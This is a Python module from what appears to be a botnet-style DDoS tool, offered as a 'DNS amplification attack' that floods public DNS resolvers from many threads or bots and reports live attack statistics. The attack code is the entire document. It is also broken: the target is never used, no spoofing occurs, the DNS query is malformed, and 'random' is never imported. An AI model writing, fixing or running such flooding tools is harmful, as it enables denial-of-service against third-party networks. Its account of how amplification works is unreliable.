import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor
import sys

RED = '\033[91m'
GRAY = '\033[90m'
RESET = '\033[0m'

stop_attack = False

def send_dns_query(target, thread_id, delay, bot_ip=None):
    """Send DNS query to target for amplification"""
    global stop_attack
    if stop_attack:
        return

    dns_servers = [
        "8.8.8.8",
        "8.8.4.4",
        "1.1.1.1",
        "1.0.0.1"
    ]

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)

        query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'

        for dns_server in dns_servers:
            try:
                sock.sendto(query, (dns_server, 53))
            except:
                pass

        sock.close()
    except:
        pass

def start_attack(target, settings, bots=None):
    """Start DNS amplification attack"""
    global stop_attack
    stop_attack = False

    duration = settings['duration']
    threads = settings['threads']
    delay = settings.get('delay', 0)

    # Use bots if provided, otherwise use threads count
    bot_count = len(bots) if bots else 0
    effective_threads = max(threads, bot_count) if bot_count > 0 else threads

    print(f"  Target: {target}")
    print(f"  Duration: {duration}s")
    print(f"  Threads: {threads}")
    print(f"  Active Bots: {bot_count}")
    print(f"  Total Workers: {effective_threads}")
    print(f"  Delay: {delay}ms")
    print("  " + "-" * 45)
    print(f"  {GRAY}Press Ctrl+C to stop attack{RESET}")
    print()

    start_time = time.time()
    sent_queries = 0
    last_update = start_time
    last_count = 0
    futures = []

    def worker():
        nonlocal sent_queries
        while not stop_attack and (time.time() - start_time) < duration:
            # Pick random bot IP if available
            bot_ip = None
            if bots and len(bots) > 0:
                bot = random.choice(bots)
                bot_ip = bot.get('ip')
            send_dns_query(target, threading.current_thread().ident, delay, bot_ip)
            sent_queries += 1

    try:
        executor = ThreadPoolExecutor(max_workers=effective_threads)
        for _ in range(effective_threads):
            futures.append(executor.submit(worker))

        while not stop_attack and (time.time() - start_time) < duration:
            time.sleep(0.5)
            elapsed = time.time() - start_time
            if elapsed - last_update >= 1:
                interval = elapsed - last_update
                rps = (sent_queries - last_count) / max(interval, 0.001)
                last_count = sent_queries
                last_update = elapsed
                print(f"  {GRAY}Sent: {sent_queries} | Time: {elapsed:.1f}s | RPS: {rps:.1f} | Bots: {bot_count}{RESET}", end='\r')

        stop_attack = True
        for future in futures:
            future.cancel()
        executor.shutdown(wait=False)

    except KeyboardInterrupt:
        stop_attack = True
        print(f"\n  {RED}Attack stopped by user{RESET}")
        for future in futures:
            future.cancel()
        executor.shutdown(wait=False)

    elapsed = time.time() - start_time
    avg_rps = sent_queries / elapsed if elapsed > 0 else 0
    print()
    print("  " + "-" * 45)
    print(f"  Attack completed!")
    print(f"  Total queries sent: {sent_queries}")
    print(f"  Elapsed time: {elapsed:.2f}s")
    print(f"  Average RPS: {avg_rps:.2f}")
    print(f"  Active Bots: {bot_count}")
